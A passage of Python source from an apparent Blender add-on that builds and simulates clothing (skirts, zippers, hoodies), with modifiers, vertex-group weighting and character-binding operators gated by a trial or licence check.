                
                waisttop = append_selected_vertices_indices_to_array()
                bpy.ops.mesh.select_more()
                #group_vertices(name_of_group="Pinning", weight=0)
                
                bpy.ops.mesh.select_all(action='INVERT')
                group_vertices(name_of_group="Pressure", weight=0)
                bpy.ops.object.mode_set(mode='EDIT')
                replace_weights(group="Pinning", weight=0)
                group_vertices(name_of_group="Shrinking", weight=0.5)
                bpy.ops.object.mode_set(mode='EDIT')
                replace_weights(group="Shrinkwrap", weight=0)
                group_vertices(name_of_group="PinAndShrink", weight=0)
                bpy.context.scene.tool_settings.vertex_group_weight = 1
                
                select_vertices(waist, deselect=True)
                bpy.ops.transform.edge_crease(value=1, snap=False)
                bpy.ops.mesh.mark_sharp()
                bpy.ops.mesh.mark_seam(clear=False)
                
                bpy.ops.mesh.select_all(action='SELECT')
                bpy.ops.uv.cube_project()
                bpy.ops.mesh.select_all(action='DESELECT')
                
            
            
            #Adding Modifiers
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.modifier_add(type='SUBSURF')
            bpy.context.object.modifiers["Subdivision"].levels = 1
            bpy.context.object.modifiers["Subdivision"].render_levels = 1
            bpy.context.object.modifiers["Subdivision"].show_on_cage = True
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.context.object.modifiers["Shrinkwrap"].vertex_group = "Shrinkwrap"
            #bpy.context.object.modifiers["Shrinkwrap"].wrap_method = 'PROJECT'
            bpy.context.object.modifiers["Shrinkwrap"].wrap_mode = 'OUTSIDE_SURFACE'
            bpy.context.object.modifiers["Shrinkwrap"].use_negative_direction = True
            bpy.context.object.modifiers["Shrinkwrap"].use_positive_direction = True
            if(bpy.context.scene.armature_object is not None):
                bpy.context.object.modifiers["Shrinkwrap"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0] * bpy.context.scene.armature_object.scale[0])
            else:
                bpy.context.object.modifiers["Shrinkwrap"].offset = (0.01/3)/(bpy.context.scene.character_object.scale[0])
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.character_object
            bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
            bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.character_object
            bpy.ops.object.modifier_add(type='CLOTH')
            bpy.context.object.modifiers["Cloth"].collision_settings.collision_quality = 5
            bpy.context.object.modifiers["Cloth"].collision_settings.distance_min = 0.002
            bpy.context.object.modifiers["Cloth"].settings.quality = 10
            bpy.context.object.modifiers["Cloth"].collision_settings.use_self_collision = True
            bpy.context.object.modifiers["Cloth"].collision_settings.self_distance_min = 0.0025
            bpy.context.object.modifiers["Cloth"].settings.bending_stiffness = 3
            bpy.context.object.modifiers["Cloth"].settings.shrink_min = -0.3
            bpy.context.object.modifiers["Cloth"].settings.shrink_max = 0.3
            bpy.context.object.modifiers["Cloth"].settings.use_pressure = True
            bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = 50
            bpy.context.object.modifiers["Cloth"].settings.mass = 0.1
            bpy.context.object.modifiers["Cloth"].settings.tension_stiffness = 5
            bpy.context.object.modifiers["Cloth"].settings.compression_stiffness = 5
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 5
            bpy.context.object.modifiers["Cloth"].settings.tension_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.compression_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.shear_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_pressure = "Pressure"
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_mass = "Pinning"
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_shrink = "Shrinking"
            bpy.context.object.modifiers["Cloth"].collision_settings.self_friction = 2
            bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = 50
            bpy.context.object.modifiers["Cloth"].settings.pin_stiffness = 0.1
            bpy.context.object.modifiers["Cloth"].point_cache.frame_end = bpy.context.scene.frame_end = 50
            bpy.ops.object.modifier_add(type='SUBSURF')
            bpy.context.object.modifiers["Subdivision.001"].show_viewport = True
            bpy.context.object.modifiers["Subdivision.001"].levels = 2
            bpy.ops.object.modifier_add(type='EDGE_SPLIT')
            bpy.context.object.modifiers["EdgeSplit"].use_edge_angle = False
            bpy.ops.object.modifier_add(type='SOLIDIFY')
            bpy.context.object.modifiers["Solidify"].offset = 0
            bpy.context.object.modifiers["Solidify"].thickness = 0.001
            bpy.context.object.modifiers["Solidify"].show_on_cage = True
            if bpy.app.version >= (4,1,0):
                bpy.ops.object.modifier_add_node_group(asset_library_type='ESSENTIALS', asset_library_identifier="", relative_asset_identifier="geometry_nodes\\smooth_by_angle.blend\\NodeTree\\Smooth by Angle")
                bpy.context.object.modifiers["Smooth by Angle"]["Socket_1"] = True
                bpy.context.object.modifiers["Smooth by Angle"]["Input_1"] = 6.28319
            bpy.ops.preferences.addon_enable(module="space_view3d_modifier_tools")
            bpy.ops.wm.toggle_all_show_expanded()
            bpy.ops.object.shade_smooth()
            bpy.context.scene.frame_current = 1
            bpy.ops.constraint.delete(constraint="Limit Location", owner='OBJECT')
            bpy.ops.constraint.delete(constraint="Limit Rotation", owner='OBJECT')
            
            bpy.ops.object.hide_view_clear()
            bpy.ops.object.select_all(action='DESELECT')
            #bpy.ops.screen.animation_play()
            
            bpy.context.preferences.view.language = safelanguage
            bpy.context.space_data.shading.color_type = 'MATERIAL'
            bpy.ops.ed.undo_push(message="Generate Divine Skirt")
            poop = random.randint(-1, 5)
            if(poop == 0):
                bpy.ops.object.play_sound(sound_name="thisskirt.mp3")
            elif(poop == 1):
                bpy.ops.object.play_sound(sound_name="Thisisreallycool.mp3")
            elif(poop == 2):
                bpy.ops.object.play_sound(sound_name="ahyes.mp3")
            else:
                bpy.ops.object.play_sound(sound_name="Bind.mp3")
            return {'FINISHED'}

#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#
#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#
#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#
#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#
#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#
#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#
#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#
#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#
#-----------------------------------------------------  PAINT GROUP -----------------------------------------------------#


class OBJECT_OT_paint_group(bpy.types.Operator):
    bl_idname = "object.paint_group"
    bl_label = "Paint Group"
    
    group_name: bpy.props.StringProperty()
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        safelanguage = bpy.context.preferences.view.language
        bpy.context.preferences.view.language = 'en_US'
        bpy.context.scene.frame_current = bpy.context.scene.frame_start
        # Set the active vertex group
        if self.group_name in context.object.vertex_groups:
            if "Hoodie" not in bpy.context.active_object.name:
                bpy.context.scene.cloth_object.vertex_groups.active_index = bpy.context.scene.cloth_object.vertex_groups[self.group_name].index
            else:
                bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups[self.group_name].index
            #bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            if "Hoodie" not in bpy.context.active_object.name:
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            if(bpy.context.mode != 'WEIGHT_PAINT'):
                #bpy.ops.paint.weight_paint_toggle()
                bpy.ops.object.mode_set(mode = 'WEIGHT_PAINT')
                bpy.context.space_data.overlay.weight_paint_mode_opacity = 0.7
            self.report({'INFO'}, f"Active vertex group set to: {self.group_name}")
        elif (self.group_name == 'Refresh'):
            mesh = bpy.context.scene.cloth_object.data
            group_a = bpy.context.scene.cloth_object.vertex_groups.get('PinAndShrink')
            group_b = bpy.context.scene.cloth_object.vertex_groups.get('Shrinkwrap')
            group_c = bpy.context.scene.cloth_object.vertex_groups.get('Pinning')
            for vert in mesh.vertices:
                # Get the vertex index
                vert_index = vert.index
                
                # Get the weights of vertex group A for the current vertex
                a_weight = group_a.weight(vert_index)
                
                # Set the weights of vertex groups B and C to match the weight of group A
                group_b.add([vert_index], a_weight, 'REPLACE')
                group_c.add([vert_index], a_weight, 'REPLACE')
        elif(self.group_name == 'ShrinkRefresh'):
            mesh = bpy.context.scene.cloth_object.data
            group_a = bpy.context.scene.cloth_object.vertex_groups.get('Shrinking')
            for vert in mesh.vertices:
                vert_index = vert.index
                bpy.context.scene.cloth_object.vertex_groups.get('Shrinking').add([vert_index], 0.5, 'REPLACE')
        elif(self.group_name == 'PressureRefresh'):
            mesh = bpy.context.scene.cloth_object.data
            for vert in mesh.vertices:
                vert_index = vert.index
                bpy.context.scene.cloth_object.vertex_groups.get('Pressure').add([vert_index], 0.0, 'REPLACE')
        elif(self.group_name == 'PuffRefresh'):        
            bpy.ops.object.mode_set(mode = 'EDIT')
            bpy.ops.mesh.select_all(action='SELECT')
            replace_weights(group="Pressure", weight=0)
            replace_weights(group="Shrinking", weight=0.5)
            bpy.ops.object.mode_set(mode = 'EDIT')
            '''
            mesh = bpy.context.active_object.data
            #selected_vertices = [v for v in mesh.vertices if v.select]
            selected_edges = [e for e in mesh.edges if e.select]
            selected_faces = [f for f in mesh.polygons if f.select]
            if len(selected_faces) == 0 and len(selected_edges) > 1:
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.mesh.select_all(action='SELECT')
                replace_weights(group="Pressure", weight=0)
                replace_weights(group="Shrinking", weight=0.5)
                bpy.ops.object.mode_set(mode = 'EDIT')
                '''
        elif(self.group_name == 'PinSet'):    
            bpy.ops.object.mode_set(mode = 'EDIT')
            replace_weights(group="Pinning", weight=1)
            bpy.ops.object.mode_set(mode = 'OBJECT')
            bpy.ops.object.bind_to_character()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Pinning'].index
            bpy.ops.object.mode_set(mode = 'WEIGHT_PAINT')
        elif(self.group_name == 'ShrinkSet'):    
            bpy.ops.object.mode_set(mode = 'EDIT')
            replace_weights(group="Shrinkwrap", weight=1)
            #bpy.ops.object.mode_set(mode = 'WEIGHT_PAINT')
        elif(self.group_name == 'SmoothSet'):    
            bpy.ops.object.mode_set(mode = 'EDIT')
            replace_weights(group="Smooth", weight=1)
        else:
            self.report({'ERROR'}, f"Vertex group '{self.group_name}' not found.")
        
        bpy.context.preferences.view.language = safelanguage
        return {'FINISHED'}

#bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Pressure'].index


class OBJECT_OT_apply_form(bpy.types.Operator):
    bl_idname = "object.apply_form"
    bl_label = "Apply Form"
    
    
    def execute(self, context):
        bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
        bpy.ops.object.modifier_apply_as_shapekey(keep_modifier=True, modifier="Cloth")
        bpy.context.scene.frame_current = bpy.context.scene.frame_start
        bpy.context.object.active_shape_key_index = 1
        bpy.context.scene.cloth_object.data.shape_keys.key_blocks[1].vertex_group = "ApplyForm"
        bpy.context.scene.cloth_object.data.shape_keys.key_blocks[1].value = 1.0
        bpy.ops.object.shape_key_remove(all=True, apply_mix=True)
        return {'FINISHED'}

class OBJECT_OT_bind_to_character(bpy.types.Operator):
    bl_idname = "object.bind_to_character"
    bl_label = "Bind to Character"
    
    
    def execute(self, context):
        return {'FINISHED'}

class OBJECT_OT_add_button(bpy.types.Operator):
    bl_idname = "object.add_button"
    bl_label = "Add Button"
    
    
    def execute(self, context):
        return {'FINISHED'}
    
class OBJECT_OT_emergency_bind(bpy.types.Operator):
    bl_idname = "object.emergency_bind"
    bl_label = "Emergency Bind"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.emergency_bind_siren = 0
            for modifier in bpy.context.scene.cloth_object.modifiers:
                if modifier.type == 'ARMATURE':
                    bpy.ops.object.modifier_add(type='DATA_TRANSFER')
                    bpy.ops.object.modifier_move_to_index(modifier="DataTransfer", index=get_modifier_index("Cloth")+1)
                    bpy.context.object.modifiers["DataTransfer"].object = bpy.context.scene.character_object
                    bpy.context.object.modifiers["DataTransfer"].use_vert_data = True
                    bpy.context.object.modifiers["DataTransfer"].data_types_verts = {'VGROUP_WEIGHTS'}
                    bpy.ops.object.datalayout_transfer(modifier="DataTransfer")
                    bpy.ops.object.modifier_apply(modifier="DataTransfer")
                    bpy.context.object.modifiers["SurfaceDeform"].show_viewport = False
                    bpy.context.object.modifiers["SurfaceDeform"].show_render = False
                    bpy.context.preferences.view.language = safelanguage
                    return {'FINISHED'}
            bpy.ops.object.play_sound(sound_name="EmergencyBind.mp3")
            for modifier in bpy.context.scene.character_object.modifiers:
                if modifier.type == 'ARMATURE':
                    bpy.context.scene.armature_object = modifier.object
            bpy.ops.object.select_all(action='DESELECT')
            bpy.context.scene.cloth_object.select_set(True)
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            bpy.ops.object.modifier_add(type='ARMATURE')
            bpy.ops.object.modifier_move_to_index(modifier="Armature", index=get_modifier_index("Cloth"))
            if(bpy.context.scene.armature_object is not None):
                bpy.context.object.modifiers["Armature"].object = bpy.context.scene.armature_object
            bpy.ops.object.modifier_apply(modifier="Mirror", report=True)
            bpy.context.object.modifiers["Smooth"].show_viewport = False
            bpy.context.object.modifiers["Smooth"].show_render = False
            bpy.ops.object.modifier_apply(modifier="Shrinkwrap", report=True)
            bpy.ops.object.modifier_apply(modifier="Shrinkwrap.001", report=True)
            bpy.ops.object.modifier_add(type='DATA_TRANSFER')
            #bpy.ops.object.modifier_move_to_index(modifier="DataTransfer", index=get_modifier_index("Cloth")+1)
            bpy.context.object.modifiers["DataTransfer"].object = bpy.context.scene.character_object
            bpy.context.object.modifiers["DataTransfer"].use_vert_data = True
            bpy.context.object.modifiers["DataTransfer"].data_types_verts = {'VGROUP_WEIGHTS'}
            bpy.ops.object.datalayout_transfer(modifier="DataTransfer")
            bpy.ops.object.modifier_apply(modifier="DataTransfer")
            bpy.context.object.modifiers["SurfaceDeform"].show_viewport = False
            bpy.context.object.modifiers["SurfaceDeform"].show_render = False
            bpy.context.preferences.view.language = safelanguage
            return{'FINISHED'}
    
class OBJECT_OT_add_zip(bpy.types.Operator):
    bl_idname = "object.add_zip"
    bl_label = "Add Zip"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            if(bpy.context.scene.zip_message == False):
                bpy.context.scene.zip_message = True
                bpy.ops.object.play_sound(sound_name="ZipperMessage.mp3")
            if(bpy.context.mode != 'EDIT_MESH'):
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.context.window_manager.popup_menu(lambda self, context: self.layout.label(text="Select a line of vertices and then press Add Zip"), title="INFO", icon='INFO')
                bpy.context.preferences.view.language = safelanguage
                return {'FINISHED'}
            source = bpy.context.active_object
            safename = source.name
            bpy.context.active_object.name = 'abouttospawnazipper'
            bpy.ops.object.mode_set(mode = 'EDIT')
            bpy.ops.mesh.duplicate_move()
            bpy.ops.mesh.separate(type='SELECTED')
            bpy.ops.object.mode_set(mode = 'OBJECT')
            Cloth = bpy.context.scene.cloth_object
            
            #Cloth =bpy.data.objects["Sphere"]
            Zip = bpy.context.scene.zip_object
            Zipper = bpy.data.objects["abouttospawnazipper.001"]
            Zipper.name = safename + "_CIM_Zipper"
            source.name = safename
            bpy.ops.object.select_all(action='DESELECT')
            bpy.context.view_layer.objects.active = Zipper
            bpy.context.object.parent = bpy.context.scene.cloth_object
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.context.object.modifiers["Shrinkwrap"].target = Cloth
            bpy.data.objects[Zipper.name].select_set(True)
            bpy.context.view_layer.objects.active = Zipper
            #
            if("Mirror" in bpy.context.object.modifiers):
                bpy.ops.object.modifier_remove(modifier="Mirror")
            if("Solidify" in bpy.context.object.modifiers):
                bpy.ops.object.modifier_remove(modifier="Solidify")
            bpy.ops.object.convert(target='MESH')
            bpy.ops.object.mode_set(mode = 'EDIT')
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.remove_doubles()
            #
            bpy.ops.object.mode_set(mode = 'OBJECT')
            bpy.ops.object.convert(target='CURVE')
            bpy.ops.object.mode_set(mode = 'EDIT')
            bpy.ops.curve.select_all(action='SELECT')
            bpy.ops.curve.subdivide()
            bpy.context.scene.tool_settings.proportional_edit_falloff = 'SMOOTH'
            bpy.context.scene.tool_settings.proportional_distance = 0.076278
            bpy.ops.object.mode_set(mode = 'OBJECT')
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
            bpy.context.object.modifiers["Shrinkwrap"].use_apply_on_spline = True
            bpy.context.object.modifiers["Shrinkwrap"].wrap_mode = 'OUTSIDE_SURFACE'
            bpy.context.object.modifiers["Shrinkwrap"].offset = 0.001
            bpy.ops.object.modifier_apply(modifier="Shrinkwrap", report=True)
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
            bpy.context.object.modifiers["Shrinkwrap"].use_apply_on_spline = True
            bpy.context.object.modifiers["Shrinkwrap"].wrap_mode = 'OUTSIDE_SURFACE'
            bpy.context.object.modifiers["Shrinkwrap"].offset = 0.001
            bpy.context.object.show_in_front = True
            #Now onto the Zip
            #bpy.context.area.ui_type = 'VIEW_3D'
            bpy.ops.object.select_all(action='DESELECT')
            bpy.data.objects[Zip.name].select_set(True)
            bpy.context.view_layer.objects.active = Zip
            
            bpy.ops.object.duplicate_move()
            Zip = bpy.context.view_layer.objects.active
            Zip.name = 'DIVINE_ZIP'
            bpy.ops.object.select_all(action='DESELECT')
            bpy.data.objects[Zip.name].select_set(True)
            bpy.context.view_layer.objects.active = Zip
            
            Zip.location = Zipper.location
            bpy.ops.object.modifier_add(type='ARRAY')
            bpy.context.object.modifiers["Array"].relative_offset_displace[0] = 0
            bpy.context.object.modifiers["Array"].relative_offset_displace[1] = 0
            bpy.context.object.modifiers["Array"].relative_offset_displace[2] = 1
            bpy.data.objects[Zipper.name].select_set(True)
            bpy.context.view_layer.objects.active = Zipper
            bpy.ops.object.parent_set(type='CURVE')
            bpy.data.objects[Zip.name].select_set(True)
            bpy.context.view_layer.objects.active = Zip
            bpy.context.object.modifiers["Curve"].deform_axis = 'POS_Z'
            bpy.context.object.modifiers["Array"].fit_type = 'FIT_CURVE'
            bpy.context.object.modifiers["Array"].curve = Zipper
            
            #bpy.ops.object.modifier_add(type='CURVE')
            #bpy.context.object.modifiers["Curve"].deform_axis = 'POS_Z'
            
            
            
            #Hide Curve
            #bpy.ops.object.select_all(action='DESELECT')
            #bpy.data.objects[Zipper.name].select_set(True)
            #bpy.context.view_layer.objects.active = Zipper
            #bpy.context.area.ui_type = 'VIEW_3D'
            #bpy.ops.object.hide_view_set(unselected=False)
            
            
            
            #Bind Zip
            #bpy.context.view_layer.objects.active = Zip
            bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
            bpy.context.object.modifiers["SurfaceDeform"].target = Cloth
            #bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
            bpy.context.object.modifiers["Curve"].show_in_editmode = True
            bpy.context.object.modifiers["Curve"].show_on_cage = True
            bpy.ops.ed.undo_push(message="Divine Zip")
            bpy.context.preferences.view.language = safelanguage
            return{'FINISHED'}

class OBJECT_OT_bind_to_character(bpy.types.Operator):
    bl_idname = "object.bind_to_character"
    bl_label = "Bind to Character"
    bl_description = "Binds the selected object to the Cloth. If the Divine Cloth is selected, it binds the Cloth Pins to the character. If nothing is selected, it smartly binds all Divine Objects in the scene"
    
    
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        elif(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        elif(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.ops.object.mode_set(mode = 'OBJECT')
            selected_objects = bpy.context.selected_objects
            #bpy.ops.object.play_sound(sound_name="Bind.mp3")    

            if(selected_objects == []):
                divine_objects = []
                for obj in bpy.data.objects:
                    if "Divine" in obj.name and obj.name in bpy.context.view_layer.objects:
                        selected_objects.append(obj)
            for obj in selected_objects:
                bpy.ops.object.select_all(action='DESELECT')
                obj.select_set(True)
                bpy.context.view_layer.objects.active = obj

                if 'DIVINE_ZIP' in obj.name or 'Divine_Thread' in obj.name:
                    if(get_modifier_index("SurfaceDeform") is None):
                        bpy.ops.object.convert(target='MESH')
                if("SurfaceDeform" in bpy.context.object.modifiers):
                    if("Xane_Buckle" in obj.name):
                        if(bpy.context.object.modifiers["SurfaceDeform"].is_bound):
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            #return{'FINISHED'}
                        else:
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            #return{'FINISHED'}
                        bpy.ops.object.select_hierarchy(direction='CHILD', extend=False)
                        if(bpy.context.object.modifiers["SurfaceDeform"].is_bound):
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            bpy.ops.object.select_hierarchy(direction='PARENT', extend=False)
                            return{'FINISHED'}
                        else:
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            bpy.ops.object.select_hierarchy(direction='PARENT', extend=False)
                            return{'FINISHED'}
                        
                        
                    if(obj == bpy.context.scene.cloth_object):
                        for modifier in bpy.context.scene.cloth_object.modifiers:
                            if modifier.type == 'ARMATURE':
                                bpy.ops.object.emergency_bind()
                                return {'FINISHED'}
                        #bpy.context.object.parent = bpy.context.scene.character_object
                        bpy.ops.object.select_all(action='DESELECT')
                        parent = bpy.context.scene.character_object
                        child = bpy.context.scene.cloth_object
                        parent.select_set(True)
                        child.select_set(True)
                        bpy.context.view_layer.objects.active = parent
                        bpy.ops.object.parent_set(type='OBJECT', keep_transform=True)
                        bpy.ops.object.select_all(action='DESELECT')
                        child.select_set(True)
                        bpy.context.view_layer.objects.active = child
                        if(bpy.context.scene.character_object == bpy.context.scene.cloth_object):
                            self.report({'ERROR'}, f"The Character Object can not be the Cloth Object")
                            #return{'FINISHED'}
                        bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.character_object      
                        if(bpy.context.object.modifiers["SurfaceDeform"].is_bound == True):
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            if(bpy.context.object.modifiers["SurfaceDeform"].is_bound == False):
                                bpy.context.scene.emergency_bind_siren += 1
                                if(bpy.context.scene.emergency_bind_siren >= 3):
                                    bpy.ops.object.emergency_bind()
                            else:
                                bpy.context.scene.emergency_bind_siren = 0
                        else:
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            if(bpy.context.object.modifiers["SurfaceDeform"].is_bound == False):
                                bpy.context.scene.emergency_bind_siren += 1
                                if(bpy.context.scene.emergency_bind_siren >= 3):
                                    bpy.ops.object.emergency_bind()
                            else:
                                bpy.context.scene.emergency_bind_siren = 0
                    else:
                        bpy.context.object.parent = bpy.context.scene.cloth_object
                        if "Hoodie" not in obj.name:
                            if(bpy.context.object.modifiers["SurfaceDeform"].target is None):
                                bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.cloth_object
                        else:
                            if(bpy.context.object.modifiers["SurfaceDeform"].target is None):
                                bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.character_object
                        if(bpy.context.object.modifiers["SurfaceDeform"].is_bound):
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                        else:
                            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                else:
                    bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
                    if("Divine_Pocket" in obj.name or "Divine_Decal" in obj.name):
                        bpy.ops.object.modifier_move_to_index(modifier="SurfaceDeform", index=1)
                    bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.cloth_object
                    bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                bpy.context.preferences.view.language = safelanguage
                
                if("SurfaceDeform.001" in bpy.context.object.modifiers):
                    if(bpy.context.object.modifiers["SurfaceDeform.001"].is_bound):
                        bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform.001")
                        bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform.001")
                    else:
                        bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform.001")
            bpy.ops.object.play_sound(sound_name="Bind.mp3")
            return {'FINISHED'}
        else:
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
    
class OBJECT_OT_add_hoodie(bpy.types.Operator):
    bl_idname = "object.add_hoodie"
    bl_label = "Add Hoodie"
    bl_description = ""
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            if(bpy.context.scene.cloth_object is None):
                return
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            solidifymass = bpy.context.object.modifiers["Solidify"].thickness
            solidifyoffset = bpy.context.object.modifiers["Solidify"].offset
            
            top = bpy.context.scene.cloth_object
            asv = add_single_vertex
            length = edge_length(1,2)
            #1
            L = select_vertices([2,61], get_location = True, deselect=True)
            D = edge_length(2,61)
            Placement1 = mathutils.Vector((L[0], L[1], L[2] + (D/2)))
            
            #2
            L = select_vertices([39], get_location=True, deselect=True)
            D = edge_length(39,60)
            Placement2 = mathutils.Vector((L[0], L[1], L[2] + (D/2)))
            
            #3
            L = select_vertices([10,39], get_location=True, deselect=True)
            D = edge_length(10,39)
            Placement3 = mathutils.Vector((L[0], L[1], L[2] + D))
            
            #4
            L = select_vertices([39,61], get_location=True, deselect=True)
            D = edge_length(39,61)
            Placement4 = mathutils.Vector((L[0], L[1], L[2] + (D*1.4)))
            
            BBN = select_vertices([0], get_location=True, deselect=True)
            BBN6 = select_vertices([6], get_location=True, deselect=True)
            BBN5 = select_vertices([5], get_location=True, deselect=True)
            BBN4 = select_vertices([4], get_location=True, deselect=True)
            BBN3 = select_vertices([3], get_location=True, deselect=True)
            BBN2 = select_vertices([2], get_location=True, deselect=True)
            BBN1 = select_vertices([1], get_location=True, deselect=True)
            
            #5,10,11
            neck_diameter = edge_length(1,0)
            La = select_vertices([0,1], get_location=True, cursor_to_selected=True, deselect=True)
            bpy.ops.object.mode_set(mode='OBJECT')
            Head_Point = find_size(along_z=True, center=True, tape_name="Headheight")
            Lm = find_extreme_vertex(bpy.data.objects.get("Headheight_Z_TAPE_CIM"), "Z", 'max', delete=True)
            Lml = select_vertices([0], get_location=True, deselect=True)
            Placement5 = mathutils.Vector((0, La[1], Lml[2]+length*1.1))
            Placement10 = mathutils.Vector((0, La[1] - neck_diameter*0.25, Lml[2]+length*0.9))
            Placement11 = mathutils.Vector((0, La[1] - neck_diameter*0.50, Lml[2]+length*0.50))
            Placement12 = mathutils.Vector((0, La[1] + neck_diameter*0.25, Lml[2]+length*1))
            Placement13 = mathutils.Vector((0, La[1] + neck_diameter*0.50, Lml[2]+length*0.7))
            Placement14 = mathutils.Vector((0, La[1] + neck_diameter*0.85, Lml[2]-length*0.3))
            Placement15 = mathutils.Vector((0, La[1] + neck_diameter, Lml[2]-length*1.8))
            Placement16 = mathutils.Vector((0, La[1] + neck_diameter*1.2, Lml[2]-length*5.1))
            Placement17 = mathutils.Vector((0, La[1] + neck_diameter*1, BBN[2]))
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.delete(use_global=False)
            bpy.context.view_layer.objects.active = top
            bpy.ops.object.mode_set(mode='EDIT')
            
            #6
            L = select_vertices([40], get_location=True, deselect=True)
            Placement6 = mathutils.Vector((L[0], L[1], L[2] + length/2))
            
            
            bpy.ops.object.mode_set(mode='OBJECT')
            add_mesh("Hoodie")
            hoodie = bpy.context.active_object
            asv(Placement1, "Hoodie")
            asv(Placement2, "Hoodie")
            asv(Placement3, "Hoodie")
            asv(Placement4, "Hoodie")
            asv(Placement5, "Hoodie")
            asv(Placement6, "Hoodie")
            
            #7
            L1 = select_vertices([1], get_location=True, deselect=True)
            L2 = select_vertices([2], get_location=True, deselect=True)
            L3 = select_vertices([5], get_location=True, deselect=True)
            L4 = select_vertices([1,2], get_location=True, deselect=True)
            Placement7 = mathutils.Vector((L4[0], L3[1], L2[2]+length*0.5))
            
            asv(Placement7, "Hoodie")
            join_vertices([0,3], new=True)
            join_vertices([2,3], new=True)
